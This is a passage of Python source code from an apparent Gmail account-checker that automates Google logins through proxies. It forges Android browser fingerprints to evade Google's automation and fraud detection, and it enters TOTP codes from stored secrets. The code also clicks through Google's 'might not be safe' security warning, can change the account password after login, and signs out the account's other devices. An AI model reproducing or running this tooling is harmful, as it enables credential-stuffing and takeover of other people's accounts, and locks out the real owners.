                    {"brand": "Google Chrome", "version": fp["chromeVersion"].split(".")[0]},
                ],
                "fullVersionList": [
                    {"brand": "Not(A;Brand",   "version": "8.0.0.0"},
                    {"brand": "Chromium",      "version": fp["chromeVersion"]},
                    {"brand": "Google Chrome", "version": fp["chromeVersion"]},
                ],
                "fullVersion": fp["chromeVersion"],
                "platform": "Android",
                "platformVersion": str(fp["androidVersion"]) + ".0.0",
                "architecture": "",
                "model": fp["model"],
                "mobile": True,
                "bitness": "",
                "wow64": False,
                "formFactors": ["Mobile"],
            },
        })
        log(f"CDP Emulation UA override set → platform={fp['platform']} (with userAgentMetadata)")
    except Exception as e:
        log(f"CDP Emulation UA override warning (non-fatal): {e}")

    _login_result: dict = {}
    try:
        _login_result = _do_login(
            driver, email, password, totp_code, totp_secret, fresh_profile,
            change_password_after_login,
        )

        # ── Post-login geo fallback (driver still open here!) ──────────────────
        # If geo lookup failed at fingerprint time (fp has no "ip"), try now —
        # Chrome just proved the proxy works. Driver is still open so CDP re-injection
        # actually takes effect for this session (not after quit like before).
        # Use _retries=1: one round tries all 3 services — no need for more.
        if not fp.get("ip") and (proxy_for_ip_check or proxy):
            _fb_proxy = proxy_for_ip_check or proxy
            log("Post-login geo fallback: fingerprint has no IP, retrying geo lookup now…")
            _fallback_geo = geo_lookup_proxy(_fb_proxy, _label="post-login", _retries=1)
            if _fallback_geo:
                for _k, _v in _fallback_geo.items():
                    if _v is not None:
                        fp[_k] = _v
                fp["geoLocked"] = True
                # Persist so next check reads cached geo instantly
                _fp_path = os.path.join(profile_dir, "fingerprint.json")
                try:
                    with open(_fp_path, "w") as _fpf:
                        json.dump(fp, _fpf, indent=2)
                    log(f"Post-login geo saved → {fp.get('ip')} | {fp.get('city')}, {fp.get('countryCode')}")
                except Exception as _fpe:
                    log(f"Post-login geo fingerprint save failed: {_fpe}")
                # Re-inject correct timezone + language into the STILL-OPEN Chrome via CDP
                try:
                    driver.execute_cdp_cmd("Emulation.setTimezoneOverride",
                                           {"timezoneId": fp["timezone"]})
                    driver.execute_cdp_cmd("Emulation.setLocaleOverride",
                                           {"locale": fp["language"]})
                    log(f"Post-login CDP tz/lang re-applied → {fp['timezone']} / {fp['language']}")
                except Exception as _cdp_tz:
                    log(f"Post-login CDP re-apply skipped (non-fatal): {_cdp_tz}")
            else:
                log("⚠️ Post-login geo fallback also failed — fingerprint timezone may not match exit IP.")

    except Exception as e:
        log(f"Login exception: {e}")
        _login_result = {"status": "unknown", "reason": f"Login error: {str(e)[:300]}", "totpCode": totp_code}
    finally:
        try:
            driver.quit()
        except Exception:
            pass
        _cleanup(None, _xvfb_proc)
        if _local_proxy_server is not None:
            try:
                _local_proxy_server.shutdown()
            except Exception:
                pass
        # Release Chrome session slot — next queued account can now start its Chrome
        try:
            fcntl.flock(_session_lock_fd, fcntl.LOCK_UN)
            _session_lock_fd.close()
            log("Chrome session slot released")
        except Exception:
            pass

    _login_result["exitIp"] = exit_ip
    _login_result["fingerprint"] = fp_summary
    # Build fingerprintData AFTER post-login geo fallback so it shows the updated
    # timezone + geoLocked=True (not the stale random values from before fallback)
    _FP_DISPLAY_KEYS = (
        "model", "androidVersion", "chromeVersion", "platform",
        "screenW", "screenH", "dpr",
        "webglVendor", "webglRenderer",
        "hwConcurrency", "deviceMemory", "maxTouchPoints",
        "language", "timezone", "countryCode", "geoLocked",
        "batteryLevel", "batteryCharging", "dischargingTime",
        "doNotTrack", "connectionRtt", "connectionDownlink",
        "historyLength", "canvasSeed", "audioNoise", "webglNoise",
    )
    _login_result["fingerprintData"] = {k: fp[k] for k in _FP_DISPLAY_KEYS if k in fp}

    # Full IP details from fingerprint (includes post-login fallback result if applicable)
    if fp.get("ip"):
        _login_result["ipInfo"] = {k: fp.get(k) for k in ("ip","city","district","zip","region","country","continent","continentCode","countryCode","isp","org","as","asname","reverse","currency","offset","mobile","proxy","hosting") if fp.get(k) is not None}
        log(f"Exit IP: {fp.get('ip')} | {fp.get('city')}, {fp.get('countryCode')} | {fp.get('isp')}")
    else:
        _login_result["ipInfo"] = None
        log("Exit IP: unavailable (geo lookup failed at fingerprint time and post-login fallback)")
    return _login_result


def _cleanup(path: str | None, xvfb_proc=None):
    # Clear SIGTERM handler refs so a late signal doesn't double-quit
    global _active_driver, _active_xvfb, _active_locks
    _active_driver = None
    _active_xvfb   = None
    _active_locks  = []
    if path and os.path.exists(path):
        try:
            os.unlink(path)
        except Exception:
            pass
    if xvfb_proc is not None:
        try:
            xvfb_proc.terminate()
            xvfb_proc.wait(timeout=3)
        except Exception:
            pass


# ── Login flow ────────────────────────────────────────────────────────────────

def _do_login(
    driver,
    email: str,
    password: str,
    totp_code: str | None,
    totp_secret: str | None = None,
    fresh_profile: bool = False,
    change_password_after_login: bool = False,
) -> dict:
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys

    # One TOTP code per 30s window — reuse across multiple prompts in the same window.
    _totp_cache: dict = {
        "code": totp_code,
        "window": totp_current_window() if totp_code else None,
        "reused": False,
    }

    def page_state():
        url = driver.current_url
        try:
            text = driver.find_element(By.TAG_NAME, "body").text.lower()
        except Exception:
            text = ""
        return url, text

    def screenshot_b64() -> str | None:
        try:
            return f"data:image/jpeg;base64,{base64.b64encode(driver.get_screenshot_as_png()).decode()}"
        except Exception:
            return None

    def get_hostname(url: str) -> str:
        """Return the actual hostname from the URL (not query string)."""
        try:
            from urllib.parse import urlparse
            return urlparse(url).hostname or ""
        except Exception:
            return ""

    def classify(url: str, text: str) -> dict | None:
        host = get_hostname(url)
        # Password-settings page after sign-in — demo mode fills it elsewhere.
        if (
            host == "myaccount.google.com"
            and is_google_password_change_url(url)
            and not change_password_after_login
        ):
            rand_sleep(400, 700)
            shot = screenshot_b64()
            log("Signed in — password page reached, password not changed")
            return {
                "status": "opened",
                "reason": "Signed in. Stopped on the password page without changing it.",
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }
        if host == "myaccount.google.com" and is_google_password_change_url(url):
            return None

        # Signed-in Google Account home is the success page. The inbox is not required.
        if signed_in_host(url):
            rand_sleep(400, 700)
            shot = screenshot_b64()
            log("Google account home loaded — login successful")
            if fresh_profile:
                try:
                    log("Logging out (fresh profile mode)")
                    driver.get("https://accounts.google.com/Logout?continue=https://myaccount.google.com/")
                    rand_sleep(700, 1200)
                except Exception as _le:
                    log(f"Logout warning (non-fatal): {_le}")
            else:
                log("Account home open — keeping session (same-device mode, no logout)")
            return {
                "status": "opened",
                "reason": "Google account login successful ✅",
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }

        # Must literally BE at mail.google.com — not just have it in a ?continue= param
        at_mailbox = host == "mail.google.com" or host.endswith(".mail.google.com")

        has_compose = False
        if at_mailbox:
            try:
                has_compose = len(driver.find_elements(By.CSS_SELECTOR,
                    '[gh="cm"],[data-tooltip="Compose"],[aria-label="Compose"]')) > 0
            except Exception:
                pass

        has_inbox_text = False
        if at_mailbox:
            has_inbox_text = (
                "compose" in text
                or ("inbox" in text and "sign in" not in text and "create an account" not in text)
                or ("primary" in text and at_mailbox)
            )

        if at_mailbox and (has_compose or has_inbox_text or "mail/u/" in url or "mail/mu/" in url or "/mail/mp/" in url):
            rand_sleep(500, 800)
            shot = screenshot_b64()
            # ── Logout only on fresh_profile=True (profile gets wiped anyway) ──────
            # When fresh_profile=False we keep the session alive so Google sees a
            # returning known device on the next check — immediate login+logout on a
            # "new" device every run is what triggers account flags after 2-3 days.
            if fresh_profile:
                try:
                    log("Mailbox opened — logging out (fresh profile mode)")
                    driver.get("https://accounts.google.com/Logout?continue=https://mail.google.com")
                    rand_sleep(700, 1200)
                    log("Logout complete")
                except Exception as _le:
                    log(f"Logout warning (non-fatal): {_le}")
            else:
                log("Mailbox opened — keeping session (same-device mode, no logout)")
            return {
                "status": "opened",
                "reason": "Mailbox opened successfully ✅",
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }

        # ── "Verify that it's you — Google Authenticator" fallback ───────────
        # URL: accounts.google.com/v3/signin/TL=... (not standard challenge/ format)
        # This is the TOTP *input* page (code entry field visible), NOT the method
        # selection page (challenge/dp, challenge/selection).
        # "challenge" NOT in url ensures we never trigger on v3/signin/challenge/dp.
        # Google showed this page AFTER accepting the password → password is correct.
        # The TOTP entry path (Step 4 / _on_totp_url) should have handled this already,
        # but if it falls through here attempt to enter the TOTP, reach the inbox,
        # then logout cleanly before returning opened.
        _low = text.lower()
        if (
            "v3/signin" in url
            and "v3/signin/identifier" not in url
            and "challenge" not in url
            and any(x in _low for x in [
                "google authenticator",
                "verification code from",
                "authenticator app",
                "verify that it's you",
            ])
        ):
            log(f"{email} — v3/signin Google Authenticator page in classify() — attempting TOTP entry")
            _totp_selectors_fb = [
                'input[name="totpPin"]', 'input[name="Pin"]', 'input[id="totpPin"]',
                'input[autocomplete="one-time-code"]', 'input[type="tel"]',
                'input[aria-label*="code"]', 'input[aria-label*="Code"]',
                'input[placeholder*="code"]', 'input[placeholder*="Code"]',
                'input[type="number"]',
            ]
            if totp_secret:
                _fb_field = wait_for_any(_totp_selectors_fb, timeout=8)
                if _fb_field:
                    # Regenerate TOTP — original code may be 60 s+ old
                    _fb_code = generate_totp(totp_secret)
                    if _fb_code:
                        _secs_left = 30 - (int(time.time()) % 30)
                        if _secs_left <= 4:
                            log(f"{email} — TOTP window ending in {_secs_left}s, waiting for next window…")
                            time.sleep(_secs_left + 1)
                            _fb_code = generate_totp(totp_secret)
                        log(f"{email} — Entering TOTP on second challenge page: {_fb_code}")
                        try:
                            touch_click(driver, _fb_field)
                            rand_sleep(60, 120)
                            _fb_field.clear()
                            rand_sleep(40, 80)
                            clipboard_type(driver, _fb_field, _fb_code)
                            rand_sleep(100, 200)
                            _fb_field.send_keys(Keys.ENTER)
                            rand_sleep(700, 1200)
                            # Wait up to 25 s for Gmail to load
                            _fb_deadline = time.time() + 25
                            while time.time() < _fb_deadline:
                                _fb_url = driver.current_url
                                if "mail.google.com" in _fb_url:
                                    break
                                time.sleep(0.5)
                            _fb_url, _fb_text = page_state()
                            log(f"{email} — After second TOTP submit: {_fb_url[:70]}")
                            shot = screenshot_b64()
                            if get_hostname(_fb_url) == "mail.google.com" or "mail.google.com" in _fb_url:
                                if fresh_profile:
                                    try:
                                        log(f"{email} — Gmail reached after second TOTP — logging out (fresh profile mode)")
                                        driver.get("https://accounts.google.com/Logout?continue=https://mail.google.com")
                                        rand_sleep(700, 1200)
                                        log(f"{email} — Logout complete")
                                    except Exception as _fble:
                                        log(f"Logout warning (non-fatal): {_fble}")
                                else:
                                    log(f"{email} — Gmail reached after second TOTP — keeping session (same-device mode)")
                            return {
                                "status": "opened",
                                "reason": "Mailbox opened successfully ✅",
                                "totpCode": _fb_code,
                                "debugScreenshot": shot,
                            }
                        except Exception as _fbe:
                            log(f"{email} — Second TOTP entry error: {_fbe}")
            # Fallback: no secret, no field, or entry error — still opened per user rule
            log(f"{email} — v3/signin Google Authenticator page in classify() → opened (account confirmed accessible)")
            shot = screenshot_b64()
            return {
                "status": "opened",
                "reason": "Mailbox opened successfully ✅",
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }

        # ── "This browser or app may not be secure" ──────────────────────────
        # Google blocks when it detects automation signals (UA-CH mismatch, etc.)
        # Clear the persistent profile so next attempt gets a fresh device identity.
        if (
            "couldn't sign you in" in text
            or "not be secure" in text
            or "browser or app may not" in text
            or "signin/blocked" in url
            or ("blocked" in url and "accounts.google.com" in url)
        ):
            shot = screenshot_b64()
            # Wipe the persistent profile — it may be tainted / flagged by Google
            try:
                import shutil
                _safe = email.replace("@", "_at_").replace(".", "_")
                _prof = os.path.join(tempfile.gettempdir(), "gmail_checker_profiles", _safe)
                if os.path.exists(_prof):
                    shutil.rmtree(_prof, ignore_errors=True)
                    log(f"Wiped stale Chrome profile: {_prof}")
            except Exception as _pe:
                log(f"Profile wipe warning: {_pe}")
            return {
                "status": "verification_required",
                "reason": (
                    "Google blocked this browser (automation detected). "
                    "Profile wiped — retry once to get a fresh device identity. "
                    "If persists, try a different proxy or wait 10-15 min."
                ),
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }

        if any(x in text for x in [
            "couldn't find your google account", "couldn't find this account",
            "no account found",
            "find your google account", "no google account found",
            "couldn't find an account", "email or phone number",
        ]):
            return {"status": "wrong_password", "reason": "Google account not found", "totpCode": totp_code}

        if any(x in text for x in [
            "wrong password", "didn't recognize", "password you entered",
            "incorrect password", "that password is incorrect",
            "the password you entered is incorrect",
            "the email or password you entered is incorrect",
            "password is wrong", "access was denied",
        ]) or any(x in url for x in ["WrongPassword", "wrongpassword"]):
            return {"status": "wrong_password", "reason": "Wrong password", "totpCode": totp_code}

        # ── "This might not be safe" — dismissible Google security interstitial ─
        # Appears when Google detects unusual connection (proxy extension, new IP, etc.)
        # Has a "Continue to sign in" button — NOT a hard block, can be bypassed.
        _ltext = text.lower()
        _is_might_not_safe = (
            "might not be safe" in _ltext
            or ("noticed something unusual" in _ltext and (
                "continue to sign in" in _ltext or "check the web address" in _ltext
            ))
        )
        if _is_might_not_safe:
            log(f"{email} — 'This might not be safe' page detected in classify(), clicking Continue to sign in")
            try:
                _clicked = driver.execute_script("""
                    var btns = Array.from(document.querySelectorAll(
                        'button, a[role="button"], [role="button"]'));
                    var found = btns.find(function(b) {
                        var t = (b.innerText || b.textContent || '').toLowerCase().trim();
                        return t.indexOf('continue to sign in') !== -1;
                    });
                    if (found) { found.click(); return true; }
                    // Fallback: first button (Continue) not last (No, don't sign in)
                    if (btns.length >= 1) { btns[0].click(); return 'fallback'; }
                    return false;
                """)
                if _clicked:
                    log(f"{email} — Clicked Continue to sign in (result={_clicked})")
                    rand_sleep(1000, 1800)
                    return None  # caller will re-check page state
                else:
                    log(f"{email} — Continue button not found on 'might not be safe' page")
            except Exception as _e:
                log(f"Continue to sign in click error: {_e}")
            # Button click failed — fall through to verification_required below

        # "challenge/pwd" is the normal password page — do NOT flag it as verification
        # "challenge/dp"  is the device-protection / 2FA selection page — handle separately
        # "challenge/totp" / "challenge/ipp" are TOTP pages — handle separately
        _2fa_urls = ("challenge/dp", "challenge/totp", "challenge/ipp",
                     "challenge/selection", "challenge/sk")
        # challenge/recaptcha is the "I'm not a robot" checkbox. It is handled
        # before classify() — do not treat it as a phone/device block.
        is_real_challenge = (
            (
                "challenge" in url
                and "challenge/pwd" not in url
                and "challenge/recaptcha" not in url
                and not any(x in url for x in _2fa_urls)
            )
            or "InterstitialConfirmation" in url
            or ("verify" in url and "mail" not in url and "challenge/pwd" not in url)
        )
        # uplevelingstep = Google account upgrade prompt (not a real security block)
        is_uplevel = "uplevelingstep" in url
        if not is_uplevel and (any(x in text for x in [
            "verify your identity", "verify it's you", "choose a way to verify",
            "confirm it's you", "unusual activity", "suspicious activity",
            "protect your account"
        ]) or is_real_challenge):
            shot = screenshot_b64()
            return {
                "status": "verification_required",
                "reason": "Google is asking for phone/device verification",
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }

        return None

    def wait_for_any(selectors: list[str], timeout: int = 12) -> object | None:
        """Wait for any of the CSS selectors and return the first visible element."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            for sel in selectors:
                try:
                    el = driver.find_element(By.CSS_SELECTOR, sel)
                    if el.is_displayed():
                        return el
                except Exception:
                    pass
            time.sleep(0.15)
        return None

    def enter_fresh_totp_once(label: str, force_new: bool = False) -> bool:
        """Submit TOTP — reuse the current 30s code unless force_new."""
        nonlocal totp_code
        if not totp_secret and not totp_code:
            return False
        from selenium.common.exceptions import StaleElementReferenceException

        code = next_fresh_totp(
            totp_secret, totp_code, cache=_totp_cache, force_new=force_new,
        )
        if not code:
            return False
        secs_remaining = totp_window_remaining()
        mode = "reuse same 30s code" if _totp_cache.get("reused") else "new 30s code"
        log(f"{email} — {label}: TOTP {mode} ({secs_remaining}s left in window)")

        for attempt in range(4):
            deadline = time.time() + 14
            field = None
            while time.time() < deadline:
                field = find_totp_input(driver)
                if field:
                    break
                field = wait_for_any(TOTP_INPUT_SELECTORS, timeout=2)
                if field:
                    break
                time.sleep(0.25)
            if not field:
                log(f"{email} — {label}: TOTP field not found")
                return False
            try:
                touch_click(driver, field)
                rand_sleep(60, 120)
                try:
                    field.clear()
                except Exception:
                    pass
                rand_sleep(40, 80)
                clipboard_type(driver, field, code)
                rand_sleep(100, 200)
                try:
                    field.send_keys(Keys.ENTER)
                except Exception:
                    pass
                driver.execute_script(
                    """
                    var btns = Array.from(document.querySelectorAll('button, [role="button"]'));
                    var next = btns.find(function(b) {
                      var t = (b.innerText || b.textContent || '').trim().toLowerCase();
                      return t === 'next' || t === 'verify' || t === 'continue';
                    });
                    if (next && !next.disabled) next.click();
                    """
                )
                totp_code = code
                log(f"{email} — {label}: TOTP submitted")
                return True
            except StaleElementReferenceException:
                log(f"{email} — {label}: stale TOTP field, re-finding ({attempt + 1}/4)")
                time.sleep(0.35)
            except Exception as exc:
                log(f"{email} — {label}: TOTP entry error: {exc}")
                time.sleep(0.35)
        return False

    def clear_totp_pages(max_rounds: int = 3, pause_label: str = "TOTP") -> None:
        """Google may show the TOTP page once or twice — same 30s code until window ends."""
        for round_i in range(max_rounds):
            url_now = driver.current_url
            if not is_totp_challenge_url(url_now):
                return
            log(f"{email} — {pause_label} page round {round_i + 1}/{max_rounds}")
            if not enter_fresh_totp_once(f"{pause_label} round {round_i + 1}"):
                return
            rand_sleep(900, 1400)

    def handle_totp_if_prompted(
        label: str, max_rounds: int = 4, *, quick: bool = False
    ) -> None:
        """Enter fresh TOTP whenever Google asks during device sign-out."""
        post_sleep = (450, 750) if quick else (1200, 1800)
        for _ in range(max_rounds):
            if not is_totp_challenge_url(driver.current_url):
                return
            log(f"{email} — {label}: TOTP re-auth")
            if not enter_fresh_totp_once(label):
                return
            rand_sleep(*post_sleep)
            _deadline = time.time() + (12 if quick else 20)
            while time.time() < _deadline:
                if not is_totp_challenge_url(driver.current_url):
                    break
                time.sleep(0.25)

    def wait_for_device_activity_loaded(timeout: float = 25.0) -> bool:
        deadline = time.time() + timeout
        while time.time() < deadline:
            handle_totp_if_prompted("Device activity TOTP", max_rounds=2)
            url_now = driver.current_url.lower()
            if "device-activity" not in url_now and "deviceactivity" not in url_now:
                time.sleep(0.4)
                continue
            try:
                body = driver.find_element(By.TAG_NAME, "body").text.lower()
            except Exception:
                body = ""
            if any(x in body for x in (
                "your devices", "device activity", "where you're signed in",
                "signed in", "sign out", "sessions", "android", "windows",
                "linux", "chrome",
            )):
                log(f"{email} — device activity page loaded")
                return True
            time.sleep(0.5)
        log(f"{email} — device activity page wait timed out")
        return False

    def confirm_device_dialog() -> None:
        driver.execute_script(
            """
            function walk(root) {
              var btns = Array.from(root.querySelectorAll('button, [role="button"]'));
              for (var b of btns) {
                var t = (b.innerText || b.textContent || '').trim().toLowerCase();
                if ((t === 'sign out' || t === 'remove' || t === 'ok' || t === 'yes') && !b.disabled) {
                  b.click();
                  return true;
                }
              }
              for (var n of root.querySelectorAll('*')) {
                if (n.shadowRoot && walk(n.shadowRoot)) return true;
              }
              return false;
            }
            walk(document);
            """
        )

    _DEVICE_JS_HELPERS = r"""
    function __visible(el) {
      if (!el) return false;
      var r = el.getBoundingClientRect();
      return r.width > 2 && r.height > 2;
    }
    function __click(el) {
      try { el.scrollIntoView({block: 'center'}); } catch(e) {}
      try { el.click(); return true; } catch(e) {}
      try {
        el.dispatchEvent(new MouseEvent('click', {bubbles: true, cancelable: true, view: window}));
        return true;
      } catch(e2) {}
      return false;
    }
    function __walkSignOut(root, out) {
      var nodes = root.querySelectorAll(
        'a, button, [role="button"], [role="link"], [role="menuitem"], span[role="link"]');
      for (var i = 0; i < nodes.length; i++) {
        var el = nodes[i];
        if (!__visible(el)) continue;
        var t = (el.innerText || el.textContent || '').trim();
        var tl = t.toLowerCase();
        var aria = (el.getAttribute('aria-label') || '').toLowerCase();
        var mix = tl + ' ' + aria;
        if (mix.indexOf('sign out') === -1) continue;
        if (mix.indexOf('signed out') !== -1) continue;
        if (mix.indexOf('sign out of all') !== -1) continue;
        if (mix.indexOf('all other') !== -1) continue;
        out.push({el: el, label: t.slice(0, 60), len: t.length || 99});
      }
      var kids = root.querySelectorAll('*');
      for (var k = 0; k < kids.length; k++) {
        if (kids[k].shadowRoot) __walkSignOut(kids[k].shadowRoot, out);
      }
    }
    """

    def _trusted_tap(el) -> bool:
        """WebDriver click first. A coordinate tap was missing Google's Sign out button."""
        if el is None:
            return False
        try:
            driver.execute_script(
                "arguments[0].scrollIntoView({block:'center', inline:'center'});", el
            )
        except Exception:
            pass
        try:
            el.click()
            return True
        except Exception:
            pass
        try:
            rect = driver.execute_script(
                """
                var r = arguments[0].getBoundingClientRect();
                return {x: r.left + r.width / 2, y: r.top + r.height / 2, w: r.width, h: r.height};
                """,
                el,
            )
            x, y = float(rect["x"]), float(rect["y"])
            if rect.get("w", 0) > 2 and rect.get("h", 0) > 2:
                driver.execute_cdp_cmd("Input.dispatchMouseEvent", {
                    "type": "mousePressed", "x": x, "y": y,
                    "button": "left", "clickCount": 1,
                })
                driver.execute_cdp_cmd("Input.dispatchMouseEvent", {
                    "type": "mouseReleased", "x": x, "y": y,
                    "button": "left", "clickCount": 1,
                })
                return True
        except Exception:
            return False
        return False

    def _find_labeled_control(kind: str):
        """Return {el, t} for More ways or Authenticator. el is a WebElement."""
        return driver.execute_script(
            """
            var kind = arguments[0];
            function norm(raw) {
              return (raw || '').toLowerCase().replace(/\\s+/g, ' ').trim();
            }
            function matches(t) {
              if (!t || t.length > 80) return false;
              if (kind === 'more') {
                return t.indexOf('more ways') !== -1 || t.indexOf('another way') !== -1
                  || t.indexOf('try again') !== -1;
              }
              return t.indexOf('authenticator') !== -1 || t.indexOf('verification code') !== -1
                || t.indexOf('enter a code') !== -1 || t.indexOf('get a code') !== -1;
            }
            function walk(root) {
              var best = null;
              if (kind !== 'more') {
                var byType = root.querySelector && root.querySelector('[data-challengetype="6"]');
                if (byType) best = {el: byType, len: 1, t: 'Google Authenticator'};
              }
              var nodes = root.querySelectorAll(
                'a, button, [role="button"], [role="link"], [data-challengetype], li, span');
              for (var i = 0; i < nodes.length; i++) {
                var node = nodes[i];
                var t = norm(node.innerText || node.textContent || '');
                if (!matches(t)) continue;
                var clickable = node.closest('button, a, [role="button"], [role="link"], li, [data-challengetype]') || node;
                if (!best || t.length < best.len) best = {el: clickable, len: t.length, t: t.slice(0, 50)};
              }
              var kids = root.querySelectorAll('*');
              for (var k = 0; k < kids.length; k++) {
                if (!kids[k].shadowRoot) continue;
                var sub = walk(kids[k].shadowRoot);
                if (sub && (!best || sub.len < best.len)) best = sub;
              }
              return best;
            }
            var hit = walk(document);
            if (!hit) return null;
            try { hit.el.scrollIntoView({block: 'center'}); } catch (e) {}
            return hit;
            """,
            kind,
        )

    def _tap_labeled(kind: str) -> str:
        hit = _find_labeled_control(kind)
        if not isinstance(hit, dict) or hit.get("el") is None:
            return ""
        label = str(hit.get("t") or kind)
        if not _trusted_tap(hit["el"]):
            return ""
        return label

    def _click_authenticator_option() -> None:
        _tap_labeled("auth")

    def _click_try_another_way() -> str:
        """Phone prompt ('Check your Pixel') → More ways to verify."""
        return _tap_labeled("more")

    def _totp_ready() -> bool:
        return is_totp_challenge_url(driver.current_url) or find_totp_input(driver) is not None

    def _poll_until(pred, seconds: float) -> bool:
        deadline = time.time() + seconds
        while time.time() < deadline:
            try:
                if pred():
                    return True
            except Exception:
                pass
            time.sleep(0.2)
        return False

    def pass_signin_challenge(label: str) -> bool:
        """Finish challenge/dp or TOTP in place. Do not reload the page."""
        url = driver.current_url.lower()
        on_picker = "challenge/dp" in url or "challenge/selection" in url
        if not on_picker and not _totp_ready():
            return False
        log(f"{email} — {label}: Google re-auth ({url[:70]})")
        if on_picker and not _totp_ready():
            # "Check your Pixel / tap 83" is a phone prompt. More ways → TOTP.
            try:
                more = _click_try_another_way()
            except Exception as exc:
                more = ""
                log(f"{email} — more-ways click: {exc}")
            if more:
                log(f"{email} — clicked '{more}'")
            else:
                log(f"{email} — More ways to verify button not found")
            time.sleep(0.6)
            if not _poll_until(_totp_ready, 3.0):
                auth = _tap_labeled("auth")
                if auth:
                    log(f"{email} — clicked '{auth}'")
                _poll_until(_totp_ready, 4.0)
        if _totp_ready():
            enter_fresh_totp_once(label)
            _poll_until(lambda: not is_totp_challenge_url(driver.current_url), 8.0)
            return True
        log(f"{email} — {label}: re-auth still on {driver.current_url[:70]}")
        return False

    def _device_url_kind() -> str:
        """list | detail | other — without full page reload."""
        try:
            return driver.execute_script(
                """
                var p = location.pathname || '';
                if (p.indexOf('device-activity') === -1) return 'other';
                if (/\\/device-activity\\/[^/]+/.test(p)) return 'detail';
                return 'list';
                """
            ) or "other"
        except Exception:
            return "other"

    def return_to_device_list(max_back: int = 3) -> bool:
        """Back only from a device detail page. Never back() off a sign-in challenge."""
        for _attempt in range(max_back + 1):
            pass_signin_challenge("Device list")
            kind = _device_url_kind()
            if kind == "list":
                rand_sleep(300, 500)
                return True
            if kind == "detail":
                try:
                    driver.back()
                except Exception:
                    pass
                rand_sleep(350, 550)
                continue
            break
        return _device_url_kind() == "list"

    def _wait_on_device_list(timeout: float = 12.0) -> bool:
        """Poll for the list. Solve a challenge in place — never reload from here."""
        deadline = time.time() + timeout
        solved = 0
        while time.time() < deadline:
            if _device_url_kind() == "list":
                log(f"{email} — device activity page loaded")
                return True
            url = driver.current_url.lower()
            if "challenge" in url and solved < 2:
                solved += 1
                pass_signin_challenge("Device activity")
                continue
            time.sleep(0.25)
        return _device_url_kind() == "list"

    def ensure_device_activity_list(label: str) -> bool:
        """Land on the device list. Reload only if we are not already on a challenge."""
        if _device_url_kind() == "list":
            return True
        url = driver.current_url.lower()
        on_challenge = "challenge" in url
        if not on_challenge and _device_url_kind() != "detail":
            log(f"{email} — {label}: opening device activity")
            try:
                driver.get(DEVICE_ACTIVITY_URL)
            except Exception as exc:
                log(f"{email} — device list navigation warning: {exc}")
        if _wait_on_device_list(12.0):
            return True
        if "challenge" not in driver.current_url.lower():
            log(f"{email} — {label}: one reload (was {driver.current_url[:70]})")
            try:
                driver.get(DEVICE_ACTIVITY_URL)
            except Exception as exc:
                log(f"{email} — device list navigation warning: {exc}")
            if _wait_on_device_list(8.0):
                return True
        log(f"{email} — could not open device list (url={driver.current_url[:90]})")
        return False

    def goto_device_activity_list(*, force_reload: bool = False) -> None:
        """Open list once; in-loop prefer return_to_device_list()."""
        if not force_reload and _device_url_kind() == "list":
            return
        try:
            driver.get(DEVICE_ACTIVITY_URL)
            rand_sleep(1400, 2200)
            wait_for_device_activity_loaded(18.0)
        except Exception as exc:
            log(f"{email} — device list navigation warning: {exc}")

    def all_devices_signed_out_on_page() -> bool:
        return bool(driver.execute_script(
            _DEVICE_JS_HELPERS
            + """
            var path = location.pathname || '';
            if (path.indexOf('device-activity') === -1) return false;
            if (/\\/device-activity\\/[^/]+/.test(path)) return false;
            var t = (document.body.innerText || '').toLowerCase();
            var onList = t.indexOf('your devices') !== -1 || t.indexOf('device activity') !== -1
              || t.indexOf("where you're signed in") !== -1 || t.indexOf('signed out') !== -1;
            if (!onList) return false;
            if (t.indexOf('all your devices are signed out') !== -1) return true;
            if (t.indexOf("you're signed out on all") !== -1) return true;
            if (t.indexOf('signed out on all your devices') !== -1) return true;
            function isDetailPath(pathname) {
              return /\\/device-activity\\/[^/]+/.test(pathname || '');
            }
            var links = Array.from(document.querySelectorAll('a[href*="device-activity"]'));
            var active = 0;
            for (var i = 0; i < links.length; i++) {
              var L = links[i];
              if (!__visible(L)) continue;
              try {
                var p = new URL(L.href).pathname;
                if (!isDetailPath(p)) continue;
              } catch(e) { continue; }
              var block = L.closest('[role="listitem"], li, tr') || L.parentElement || L;
              var bt = (block.innerText || '').toLowerCase();
              if (bt.indexOf('signed out') !== -1 && bt.indexOf('sign out') === -1) continue;
              active++;
            }
            return active === 0;
            """
        ))

    _SESSION_KIND_ORDER = (
        "android_phone",
        "chrome_device",
        "linux_computer",
        "windows_computer",
        "ios",
        "mac",
        "session",
    )

    def detect_session_kind(label: str) -> str:
        """Map Google device-activity row text → session kind (4 demo types + extras)."""
        t = label.lower()
        if "iphone" in t or "ipad" in t:
            return "ios"
        if "android phone" in t or "android" in t:
            return "android_phone"
        if "phone" in t and "iphone" not in t and "smartphone" not in t:
            return "android_phone"
        if "windows computer" in t or "windows" in t or "windows pc" in t:
            return "windows_computer"
        if "linux computer" in t or "linux" in t:
            return "linux_computer"
        if "chrome device" in t or "chromebook" in t or "chrome os" in t:
            return "chrome_device"
        if "chrome" in t and "windows" not in t and "linux" not in t and "mac" not in t:
            return "chrome_device"
        if "mac" in t or "macos" in t:
            return "mac"
        return "session"

    def _gather_device_sessions_js() -> list[dict]:
        raw = driver.execute_script(
            _DEVICE_JS_HELPERS
            + """
            function isDetailPath(pathname) {
              return /\\/device-activity\\/[^/]+/.test(pathname || '');
            }
            function rowStillSignedIn(text) {
              var t = (text || '').toLowerCase();
              if (t.indexOf('signed out') !== -1 && t.indexOf('sign out') === -1) return false;
              if (t.indexOf('find device') !== -1 && t.indexOf('sign out') === -1) return false;
              return true;
            }
            function sessionKind(label) {
              var t = (label || '').toLowerCase();
              if (t.indexOf('iphone') !== -1 || t.indexOf('ipad') !== -1) return 'ios';
              if (t.indexOf('android phone') !== -1 || t.indexOf('android') !== -1) return 'android_phone';
              if (t.indexOf('phone') !== -1 && t.indexOf('iphone') === -1) return 'android_phone';
              if (t.indexOf('windows computer') !== -1 || t.indexOf('windows') !== -1) return 'windows_computer';
              if (t.indexOf('linux computer') !== -1 || t.indexOf('linux') !== -1) return 'linux_computer';
